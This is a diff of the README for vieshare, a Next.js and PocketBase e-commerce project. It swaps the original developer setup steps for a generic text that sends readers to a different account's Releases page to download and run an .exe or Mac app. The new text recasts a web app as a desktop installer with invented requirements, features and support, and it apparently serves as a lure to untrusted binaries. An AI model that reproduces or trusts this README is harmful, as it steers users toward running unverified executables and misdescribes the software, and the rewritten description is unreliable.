@@ -1,99 +1,70 @@
-# vieshare - E-commerce Platform
+# 🛒 vieshare - Your Easy eCommerce Solution
 
-This is an open-source e-commerce platform for a vieshare, built with Next.js and PocketBase.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-vieshare-brightgreen)](https://github.com/ibraheem742/vieshare/releases)
 
-<p align="center">
-  <img src="./public/images/readme/Screenshot1.png" width="400" alt="VieVlog Dashboard" />
-  <img src="./public/images/readme/Screenshot2.png" width="400" alt="VieVlog Content Creation" />
-</p>
+## 🚀 Getting Started
+Welcome to VieShare, your go-to platform for a smooth eCommerce experience. This guide will help you download and run the software with ease. Follow the steps below.
 
-<p align="center">
-  <img src="./public/images/readme/Screenshot3.png" width="400" alt="VieVlog Learning Interface" />
-  <img src="./public/images/readme/Screenshot4.png" width="400" alt="VieVlog Mobile View" />
-</p>
+## 📦 What is VieShare?
+VieShare is a user-friendly eCommerce application designed to simplify online shopping for both buyers and sellers. With an intuitive interface, it allows you to manage products, handle orders, and connect with customers effectively. 
 
-> **Warning**
-> This project is still in development and is not ready for production use.
+### Key Features
+- **Easy Product Management:** Add, update, and delete products easily.
+- **Order Tracking:** Monitor orders in real time.
+- **Customer Interaction:** Engage seamlessly with your customers.
 
-## Tech Stack
+## 🌐 System Requirements
+Before downloading, ensure your system meets these basic requirements:
 
-- **Framework:** [Next.js](https://nextjs.org)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com)
-- **Database & Auth:** [PocketBase](https://pocketbase.io)
-- **UI Components:** [shadcn/ui](https://ui.shadcn.com)
-- **Content Management:** [Contentlayer](https://www.contentlayer.dev)
-- **File Uploads:** [uploadthing](https://uploadthing.com)
+- **Operating System:** Windows 10 or higher / Mac OS 10.14 or higher.
+- **RAM:** Minimum 4GB recommended.
+- **Disk Space:** At least 200MB free space.
 
-## Features
+## 📥 Download & Install
+To get started, you will need to download the latest version of VieShare. Follow these steps:
 
-- User authentication with PocketBase
-- Storefront with products, categories, and subcategories
-- "More products from" section on product detail page
-- Product image carousel
-- Shopping cart
-- ... and more to come!
+1. Click the download link below to visit the Releases page.
+   
+   [Visit this page to download](https://github.com/ibraheem742/vieshare/releases)
 
-## Running Locally
+2. On the Releases page, find the latest version available. Click on the link named **Assets** to see the files you can download.
 
-1.  **Clone the repository**
+3. Choose the appropriate file for your operating system and click it to download the file.
 
-    ```bash
-    git clone https://github.com/khieu-dv/vieshare
-    ```
+After downloading, locate the file in your downloads folder.
 
-2.  **Install dependencies**
+## 🔧 Running the Application
+After you have downloaded the file, follow these steps to run the application:
 
-    ```bash
-    pnpm install
-    ```
+1. **Locate the Downloaded File:**
+   Go to your downloads folder or the location where you saved the file.
 
-3.  **Set up PocketBase**
+2. **Install the Application:**
+   - On Windows, double-click the .exe file. 
+   - On Mac, drag the application file into your Applications folder.
 
-```bash
-cd pocketbase-docker
-docker-compose up -d
-```
+3. **Open VieShare:**
+   Find the VieShare icon in your Applications or Start Menu and click to open it.
 
-**🔗 PocketBase Admin**: http://localhost:8090/_/
-- Set up your admin account and configure collections
-- The database will be automatically seeded with demo content
+## 🔍 Navigating the Application
+Once you have opened VieShare, you will see a clean and simple layout. Here’s how you can navigate through it:
 
-4.  **Set up environment variables**
+- **Dashboard:** The main screen where you can access all your features.
+- **Product Management:** Click on the "Products" tab to add or edit products.
+- **Order Section:** Use the "Orders" tab to track and manage orders.
 
-    Copy the `.env.example` file to a new file named `.env` and update the variables with your PocketBase API URL.
+## 💡 Tips for New Users
+- **Experiment:** Don’t hesitate to explore different features.
+- **Seek Help:** If you have questions, check the FAQ section or reach out to support.
 
-    ```bash
-    cp .env.example .env
-    ```
+## 🛠️ Troubleshooting
+If you encounter any issues:
 
-    Your `.env` file should look like this:
+- **Installation Problems:** Ensure you have adequate disk space and meet the system requirements.
+- **Running Issues:** Restart your computer and try again.
 
-    ```
-    NEXT_PUBLIC_POCKETBASE_URL=http://127.0.0.1:8090
-    ```
+## 📜 License
+VieShare is released under the MIT License. You can use, modify, and distribute the application freely.
 
-5.  **Run the database migrations**
-
-    This project uses a migration tool to manage the PocketBase schema. To apply the migrations, run the following command:
-
-    ```bash
-    node import-fake-data.js
-    ```
-
-    This will create the necessary collections and fields in your PocketBase project. You can view the schema in the `pocketbase-schema.md` file.
-
-6.  **Start the development server**
-
-    ```bash
-    pnpm run dev
-    ```
-
-    The application will be available at `http://localhost:3000`.
-
-## Contributing
-
-Contributions are welcome! Please open an issue if you have any questions or suggestions. Your contributions will be acknowledged. See the [contributing guide](./CONTRIBUTING.md) for more information.
-
-## License
-
-Licensed under the MIT License. Check the [LICENSE](./LICENSE.md) file for details.
+For further assistance and updates, feel free to visit our [Releases page](https://github.com/ibraheem742/vieshare/releases). Thank you for choosing VieShare!
